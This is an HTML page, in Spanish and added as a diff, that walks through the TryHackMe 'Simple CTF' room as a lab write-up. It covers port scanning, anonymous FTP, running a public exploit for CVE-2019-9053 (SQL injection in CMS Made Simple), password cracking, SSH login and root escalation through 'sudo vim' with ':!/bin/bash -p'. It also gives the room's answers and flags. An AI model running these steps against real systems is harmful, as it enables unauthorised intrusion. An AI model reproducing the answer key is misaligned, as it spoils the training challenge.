@@ -1,0 +1,748 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Simple CTF — Writeup</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;500;700&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c0f;
+    --bg2: #0f1318;
+    --bg3: #141920;
+    --accent: #3b82f6;
+    --accent2: #ff6b35;
+    --accent3: #60a5fa;
+    --text: #c8d6e5;
+    --text-dim: #5a7080;
+    --border: #1e2d3d;
+    --red: #ff4757;
+    --yellow: #ffd32a;
+    --green: #2ecc71;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(59,130,246,0.012) 2px,
+      rgba(59,130,246,0.012) 4px
+    );
+    pointer-events: none;
+    z-index: 999;
+  }
+
+  header {
+    position: relative;
+    padding: 80px 0 60px;
+    text-align: center;
+    border-bottom: 1px solid var(--border);
+    overflow: hidden;
+  }
+
+  header::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background:
+      radial-gradient(ellipse 60% 80% at 50% 0%, rgba(37,99,235,0.12) 0%, transparent 70%),
+      radial-gradient(ellipse 40% 40% at 80% 80%, rgba(59,130,246,0.06) 0%, transparent 60%);
+  }
+
+  .header-tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 4px;
+    color: var(--accent3);
+    text-transform: uppercase;
+    margin-bottom: 16px;
+    opacity: 0.8;
+  }
+
+  h1 {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: clamp(52px, 8vw, 96px);
+    font-weight: 700;
+    letter-spacing: -2px;
+    color: #fff;
+    line-height: 1;
+    position: relative;
+  }
+
+  h1 .glow {
+    color: var(--accent3);
+    text-shadow: 0 0 40px rgba(96,165,250,0.6), 0 0 80px rgba(96,165,250,0.2);
+  }
+
+  .header-meta {
+    margin-top: 24px;
+    display: flex;
+    gap: 12px;
+    justify-content: center;
+    flex-wrap: wrap;
+  }
+
+  .tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    padding: 4px 12px;
+    border: 1px solid;
+    letter-spacing: 2px;
+  }
+  .tag.linux  { border-color: var(--green);  color: var(--green); }
+  .tag.sqli   { border-color: var(--red);    color: var(--red); }
+  .tag.ftp    { border-color: var(--accent);  color: var(--accent); }
+  .tag.sudo   { border-color: var(--yellow);  color: var(--yellow); }
+  .tag.cms    { border-color: var(--accent3); color: var(--accent3); }
+
+  .container {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 0 32px;
+  }
+
+  .phase {
+    padding: 64px 0;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .phase-header {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    margin-bottom: 36px;
+  }
+
+  .phase-num {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--accent);
+    letter-spacing: 3px;
+    white-space: nowrap;
+    opacity: 0.7;
+  }
+
+  .phase-line {
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(90deg, var(--border), transparent);
+  }
+
+  h2 {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 32px;
+    font-weight: 700;
+    color: #fff;
+    letter-spacing: 1px;
+    margin-bottom: 24px;
+  }
+
+  h2 .accent  { color: var(--accent); }
+  h2 .accent2 { color: var(--accent2); }
+  h2 .accent3 { color: var(--accent3); }
+  h2 .yellow  { color: var(--yellow); }
+  h2 .red     { color: var(--red); }
+  h2 .green   { color: var(--green); }
+
+  p {
+    color: var(--text);
+    margin-bottom: 16px;
+    font-weight: 300;
+    font-size: 17px;
+  }
+
+  .code-block {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--accent);
+    padding: 20px 24px;
+    margin: 20px 0;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: #93c5fd;
+    overflow-x: auto;
+    position: relative;
+    line-height: 1.8;
+    white-space: pre;
+  }
+
+  .code-block.cmd    { border-left-color: var(--accent2); color: #f0a080; }
+  .code-block.output { border-left-color: var(--text-dim); color: var(--text-dim); font-size: 12px; }
+  .code-block.php    { border-left-color: var(--red);  color: #f87171; }
+  .code-block.ps     { border-left-color: var(--yellow); color: #f0e080; }
+
+  .code-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 3px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+
+  .finding {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    padding: 20px 24px;
+    margin: 20px 0;
+    position: relative;
+  }
+
+  .finding::before {
+    content: '!';
+    position: absolute;
+    top: -1px;
+    left: -1px;
+    background: var(--accent2);
+    color: #000;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    font-weight: bold;
+    padding: 2px 8px;
+    letter-spacing: 2px;
+  }
+
+  .finding.info::before    { content: 'INFO';  background: var(--accent3); color: #fff; }
+  .finding.success::before { content: 'PWN';   background: var(--accent);  color: #fff; }
+  .finding.vuln::before    { content: 'VULN';  background: var(--red);     color: #fff; }
+  .finding.explain::before { content: 'CÓMO FUNCIONA'; background: var(--yellow); color: #000; }
+  .finding.tip::before     { content: 'TIP';   background: var(--green);   color: #000; }
+
+  .finding-title {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 14px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    margin-bottom: 8px;
+    padding-top: 4px;
+  }
+
+  .ports-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    margin: 20px 0;
+  }
+
+  .ports-table th {
+    text-align: left;
+    color: var(--accent);
+    letter-spacing: 3px;
+    font-size: 10px;
+    padding: 8px 16px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .ports-table td {
+    padding: 10px 16px;
+    border-bottom: 1px solid rgba(30,45,61,0.5);
+    color: var(--text);
+  }
+
+  .ports-table tr:hover td { background: rgba(59,130,246,0.03); }
+  .port-open   { color: var(--green); }
+  .port-num    { color: var(--accent2); font-weight: bold; }
+
+  .flag-box {
+    background: rgba(59,130,246,0.04);
+    border: 1px solid rgba(59,130,246,0.25);
+    padding: 16px 24px;
+    margin: 20px 0;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+  }
+
+  .flag-box.key { border-color: rgba(255,211,42,0.3); background: rgba(255,211,42,0.03); }
+
+  .flag-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 3px;
+    color: var(--accent);
+    white-space: nowrap;
+  }
+
+  .flag-box.key .flag-label { color: var(--yellow); }
+
+  .flag-value {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 14px;
+    color: #fff;
+    word-break: break-all;
+  }
+
+  code {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: var(--accent);
+    background: rgba(59,130,246,0.08);
+    padding: 1px 6px;
+  }
+
+  code.bad  { color: var(--red);    background: rgba(255,71,87,0.07); }
+  code.warn { color: var(--yellow); background: rgba(255,211,42,0.07); }
+  code.good { color: var(--green);  background: rgba(46,204,113,0.07); }
+
+  .highlight  { color: var(--accent2); }
+
+  .chain { display: flex; flex-direction: column; gap: 0; margin: 32px 0; }
+  .chain-step { display: flex; gap: 20px; align-items: flex-start; }
+
+  .chain-icon {
+    width: 40px;
+    height: 40px;
+    border: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: var(--accent);
+    flex-shrink: 0;
+    background: var(--bg2);
+  }
+
+  .chain-connector {
+    width: 40px;
+    display: flex;
+    justify-content: center;
+    padding: 4px 0;
+    flex-shrink: 0;
+  }
+
+  .chain-connector::before {
+    content: '';
+    width: 1px;
+    height: 100%;
+    background: linear-gradient(180deg, var(--border), transparent);
+    min-height: 20px;
+    display: block;
+  }
+
+  .chain-content { padding-bottom: 24px; }
+
+  .chain-title {
+    font-family: 'Rajdhani', sans-serif;
+    font-weight: 700;
+    font-size: 18px;
+    color: #fff;
+    margin-bottom: 4px;
+  }
+
+  .chain-desc { font-size: 15px; color: var(--text-dim); font-weight: 300; }
+
+  footer { padding: 48px 0; text-align: center; }
+
+  .footer-text {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 3px;
+  }
+
+  .divider {
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--border), transparent);
+    margin: 8px 0;
+  }
+
+  /* ─── TASKS ─── */
+  .task-list { display: flex; flex-direction: column; gap: 12px; margin-top: 8px; }
+
+  .task-item {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    padding: 18px 24px;
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    flex-wrap: wrap;
+  }
+
+  .task-q {
+    font-family: 'Space Mono', monospace;
+    font-size: 12px;
+    color: var(--text);
+    flex: 1;
+    min-width: 200px;
+  }
+
+  .task-a {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: #fff;
+    background: rgba(0,0,0,0.4);
+    border: 1px solid var(--border);
+    padding: 6px 16px;
+    letter-spacing: 1px;
+    white-space: nowrap;
+    filter: blur(5px);
+    user-select: none;
+    transition: filter 0.3s;
+    cursor: pointer;
+  }
+
+  .task-a:hover, .task-a.revealed { filter: blur(0); }
+
+  .task-badge {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    padding: 3px 10px;
+    border: 1px solid rgba(46,204,113,0.4);
+    color: var(--green);
+    letter-spacing: 2px;
+    white-space: nowrap;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <div class="header-tag">// TryHackMe — CTF — Writeup</div>
+    <h1>SIMPLE <span class="glow">CTF</span></h1>
+    <div class="header-meta">
+      <span class="tag linux">#linux</span>
+      <span class="tag ftp">#anon-ftp</span>
+      <span class="tag cms">#cms-made-simple</span>
+      <span class="tag sqli">#sqli</span>
+      <span class="tag sudo">#sudo-vim</span>
+    </div>
+  </div>
+</header>
+
+<main class="container">
+
+  <!-- FASE 1: RECONOCIMIENTO -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 01</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="accent">RECONOCIMIENTO</span> — Escaneo de puertos</h2>
+
+    <p>Se lanza un escaneo completo de puertos para mapear toda la superficie de ataque antes de pasar al análisis de servicios.</p>
+
+    <div class="code-label">escaneo completo</div>
+    <div class="code-block cmd">nmap -p- -T5 &lt;IP&gt; -oG allPorts</div>
+
+    <div class="code-label">escaneo de servicios y versiones</div>
+    <div class="code-block cmd">nmap -p21,80,2222 -T5 -sSCV -n -Pn &lt;IP&gt; -oN scan.txt</div>
+
+    <table class="ports-table">
+      <thead>
+        <tr>
+          <th>PUERTO</th>
+          <th>ESTADO</th>
+          <th>SERVICIO</th>
+          <th>VERSIÓN</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr><td class="port-num">21/tcp</td><td class="port-open">OPEN</td><td>ftp</td><td>vsftpd 3.0.3</td></tr>
+        <tr><td class="port-num">80/tcp</td><td class="port-open">OPEN</td><td>http</td><td>Apache 2.4.18 (Ubuntu)</td></tr>
+        <tr><td class="port-num">2222/tcp</td><td class="port-open">OPEN</td><td>ssh</td><td>OpenSSH 7.2p2</td></tr>
+      </tbody>
+    </table>
+
+    <div class="finding info">
+      <div class="finding-title">Superficie de ataque</div>
+      Tres servicios expuestos: FTP con login anónimo habilitado, un servidor web Apache y SSH corriendo en el puerto no estándar <strong style="color:#fff">2222</strong>. El <code>robots.txt</code> del servidor web filtra dos rutas: <code>/</code> y <code>/openemr-5_0_1_3</code>.
+    </div>
+  </section>
+
+  <!-- FASE 2: FTP ANÓNIMO -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 02</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="yellow">FTP ANÓNIMO</span> — Nota de credenciales</h2>
+
+    <p>El escaneo de nmap detecta que el FTP permite <strong style="color:#fff">anonymous login</strong>. El modo pasivo está bloqueado por el firewall de la red, por lo que la conexión se realiza forzando modo activo con <code>curl --ftp-port</code>:</p>
+
+    <div class="code-label">listado del directorio FTP</div>
+    <div class="code-block cmd">curl --ftp-port &lt;IP_ATACANTE&gt; ftp://anonymous:anonymous@&lt;IP&gt;/</div>
+
+    <div class="code-block output">drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub</div>
+
+    <div class="code-label">contenido de /pub</div>
+    <div class="code-block cmd">curl --ftp-port &lt;IP_ATACANTE&gt; ftp://anonymous:anonymous@&lt;IP&gt;/pub/ForMitch.txt</div>
+
+    <div class="code-block output">Dammit man... you're the worst dev i've seen. You set the same pass for the system
+user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!</div>
+
+    <div class="finding vuln">
+      <div class="finding-title">Información crítica filtrada</div>
+      El archivo <code>ForMitch.txt</code> confirma la existencia de un usuario llamado <span class="highlight">mitch</span> en el sistema, que reutiliza la misma contraseña débil en FTP y en el sistema operativo. La contraseña fue crackeada con facilidad.
+    </div>
+  </section>
+
+  <!-- FASE 3: ENUMERACIÓN WEB -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 03</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="accent3">ENUMERACIÓN WEB</span> — CMS Made Simple</h2>
+
+    <p>El servidor web Apache muestra la página por defecto de Ubuntu en la raíz. El <code>robots.txt</code> menciona <code>/openemr-5_0_1_3</code>, que resulta ser un rabbit hole (404). La aplicación vulnerable se descubre en <code>/simple</code>:</p>
+
+    <div class="code-label">identificación del CMS</div>
+    <div class="code-block output">&lt;meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019." /&gt;
+...
+CMS Made Simple version 2.2.8</div>
+
+    <div class="finding vuln">
+      <div class="finding-title">CVE-2019-9053 — SQL Injection</div>
+      <strong style="color:#fff">CMS Made Simple &lt; 2.2.10</strong> es vulnerable a una inyección SQL de tipo <strong style="color:#fff">Time-Based Blind</strong> en el módulo de búsqueda de noticias (<em>News</em>), a través del parámetro <code>cntnt01searchterm</code>. No requiere autenticación. Permite extraer usuarios, emails, salts y hashes de contraseña de la base de datos.
+    </div>
+
+    <div class="finding explain">
+      <div class="finding-title">¿Cómo funciona la SQLi Time-Based?</div>
+      El servidor no devuelve los datos directamente en la respuesta (blind), pero sí reacciona con retardos medibles cuando la condición inyectada es verdadera. El exploit automatiza la extracción caracter a caracter midiendo los tiempos de respuesta de la base de datos.
+    </div>
+  </section>
+
+  <!-- FASE 4: EXPLOTACIÓN SQLi -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 04</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="red">EXPLOTACIÓN</span> — CVE-2019-9053</h2>
+
+    <p>Se descarga el exploit público de ExploitDB (ID: 46635) y se ejecuta contra el CMS para extraer las credenciales almacenadas en la base de datos:</p>
+
+    <div class="code-label">descarga del exploit</div>
+    <div class="code-block cmd">searchsploit -m 46635
+python2 46635.py -u http://&lt;IP&gt;/simple/ --crack -w /usr/share/wordlists/rockyou.txt</div>
+
+    <div class="code-block output">[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password cracked: secret</div>
+
+    <div class="finding success">
+      <div class="finding-title">Credenciales extraídas</div>
+      Usuario <span class="highlight">mitch</span> — Contraseña <span class="highlight">secret</span> (hash MD5 con salt crackeado vía rockyou.txt)
+    </div>
+
+    <p>Se accede por SSH al puerto no estándar <strong style="color:#fff">2222</strong> con las credenciales obtenidas:</p>
+
+    <div class="code-label">acceso SSH</div>
+    <div class="code-block cmd">ssh mitch@&lt;IP&gt; -p 2222</div>
+
+    <div class="code-block output">mitch@Machine:~$ cat user.txt</div>
+
+    <div class="flag-box key">
+      <span class="flag-label">USER FLAG</span>
+      <span class="flag-value">G00d j0b, keep up!</span>
+    </div>
+  </section>
+
+  <!-- FASE 5: PRIVILEGE ESCALATION -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// 05</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2><span class="accent2">PRIVILEGE ESCALATION</span> — sudo vim</h2>
+
+    <p>Se comprueba qué comandos puede ejecutar <code>mitch</code> como root sin contraseña:</p>
+
+    <div class="code-label">comprobación de sudo</div>
+    <div class="code-block cmd">sudo -l</div>
+
+    <div class="code-block output">User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim</div>
+
+    <div class="finding vuln">
+      <div class="finding-title">Escalada via sudo vim — GTFOBins</div>
+      El usuario <code>mitch</code> puede ejecutar <code>vim</code> como root sin contraseña. Vim permite lanzar comandos de shell desde su modo de comandos con <code>:!</code>. Al ejecutarse como root, cualquier comando del sistema hereda esos privilegios.
+    </div>
+
+    <p>Se lanza <code>vim</code> con sudo y desde su interior se ejecuta una bash con el flag <code>-p</code> para preservar el UID efectivo de root:</p>
+
+    <div class="code-label">explotación</div>
+    <div class="code-block cmd">sudo vim</div>
+
+    <div class="code-block ps">:!/bin/bash -p</div>
+
+    <div class="code-block output">root@Machine:/home/mitch# whoami
+root
+
+root@Machine:/root# cat root.txt</div>
+
+    <div class="finding explain">
+      <div class="finding-title">¿Por qué funciona?</div>
+      <code>vim</code> incluye la capacidad de ejecutar comandos de shell arbitrarios mediante <code>:!comando</code>. Al invocarse con <code>sudo</code>, vim corre con UID 0 (root), por lo que cualquier comando lanzado desde él también lo hace. El flag <code>-p</code> de bash impide que se descarte el UID efectivo elevado.
+    </div>
+
+    <div class="flag-box key">
+      <span class="flag-label">ROOT FLAG</span>
+      <span class="flag-value">W3ll d0n3. You made it!</span>
+    </div>
+  </section>
+
+  <!-- TASKS -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// TASKS</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2>PREGUNTAS DE <span class="accent">TRYHACKME</span></h2>
+
+    <p>Respuestas a las preguntas oficiales de la sala. Pasa el cursor sobre la respuesta para revelarla.</p>
+
+    <div class="task-list">
+
+      <div class="task-item">
+        <span class="task-q">How many services are running under port 1000?</span>
+        <span class="task-a" onclick="this.classList.toggle('revealed')">2</span>
+        <span class="task-badge">✓ Correct</span>
+      </div>
+
+      <div class="task-item">
+        <span class="task-q">What is running on the higher port?</span>
+        <span class="task-a" onclick="this.classList.toggle('revealed')">ssh</span>
+        <span class="task-badge">✓ Correct</span>
+      </div>
+
+      <div class="task-item">
+        <span class="task-q">What's the CVE you're using against the application?</span>
+        <span class="task-a" onclick="this.classList.toggle('revealed')">CVE-2019-9053</span>
+        <span class="task-badge">✓ Correct</span>
+      </div>
+
+      <div class="task-item">
+        <span class="task-q">To what kind of vulnerability is the application vulnerable?</span>
+        <span class="task-a" onclick="this.classList.toggle('revealed')">sqli</span>
+        <span class="task-badge">✓ Correct</span>
+      </div>
+
+      <div class="task-item">
+        <span class="task-q">What's the password?</span>
+        <span class="task-a" onclick="this.classList.toggle('revealed')">secret</span>
+        <span class="task-badge">✓ Correct</span>
+      </div>
+
+      <div class="task-item">
+        <span class="task-q">Where can you login with the details obtained?</span>
+        <span class="task-a" onclick="this.classList.toggle('revealed')">ssh</span>
+        <span class="task-badge">✓ Correct</span>
+      </div>
+
+      <div class="task-item">
+        <span class="task-q">What's the user flag?</span>
+        <span class="task-a" onclick="this.classList.toggle('revealed')">G00d j0b, keep up!</span>
+        <span class="task-badge">✓ Correct</span>
+      </div>
+
+      <div class="task-item">
+        <span class="task-q">Is there any other user in the home directory? What's its name?</span>
+        <span class="task-a" onclick="this.classList.toggle('revealed')">sunbath</span>
+        <span class="task-badge">✓ Correct</span>
+      </div>
+
+      <div class="task-item">
+        <span class="task-q">What can you leverage to spawn a privileged shell?</span>
+        <span class="task-a" onclick="this.classList.toggle('revealed')">vim</span>
+        <span class="task-badge">✓ Correct</span>
+      </div>
+
+      <div class="task-item">
+        <span class="task-q">What's the root flag?</span>
+        <span class="task-a" onclick="this.classList.toggle('revealed')">W3ll d0n3. You made it!</span>
+        <span class="task-badge">✓ Correct</span>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- RESUMEN -->
+  <section class="phase">
+    <div class="phase-header">
+      <span class="phase-num">// RESUMEN</span>
+      <div class="phase-line"></div>
+    </div>
+    <h2>CADENA DE <span class="accent">ATAQUE</span></h2>
+
+    <div class="chain">
+      <div class="chain-step">
+        <div class="chain-icon">01</div>
+        <div class="chain-content">
+          <div class="chain-title">FTP Anónimo — Nota de reconocimiento</div>
+          <div class="chain-desc">Login anónimo en vsftpd → <code>/pub/ForMitch.txt</code> revela usuario <code>mitch</code> con contraseña débil reutilizada</div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon">02</div>
+        <div class="chain-content">
+          <div class="chain-title">CMS Made Simple 2.2.8 en /simple</div>
+          <div class="chain-desc">Enumeración web descubre CMS vulnerable — <code>robots.txt</code> con rabbit hole (<code>/openemr-5_0_1_3</code>)</div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color: var(--red); color: var(--red);">03</div>
+        <div class="chain-content">
+          <div class="chain-title">CVE-2019-9053 — Time-Based Blind SQLi</div>
+          <div class="chain-desc">Exploit 46635.py extrae credenciales: <code>mitch</code> / <code>secret</code> (hash MD5+salt crackeado)</div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color: var(--accent2); color: var(--accent2);">04</div>
+        <div class="chain-content">
+          <div class="chain-title">SSH en puerto 2222 — User flag</div>
+          <div class="chain-desc">Acceso como <code>mitch</code> por SSH → <code>user.txt</code>: <em>G00d j0b, keep up!</em></div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color: var(--accent); color: var(--accent);">⚡</div>
+        <div class="chain-content">
+          <div class="chain-title" style="color: var(--accent);">sudo vim → Root</div>
+          <div class="chain-desc"><code>(root) NOPASSWD: /usr/bin/vim</code> → <code>:!/bin/bash -p</code> → root → <code>root.txt</code>: <em>W3ll d0n3. You made it!</em></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="container">
+    <div class="divider"></div>
+    <br>
+    <div class="footer-text">SIMPLE CTF // WRITEUP // TRYHACKME — CTF</div>
+  </div>
+</footer>
+
+</body>
+</html>
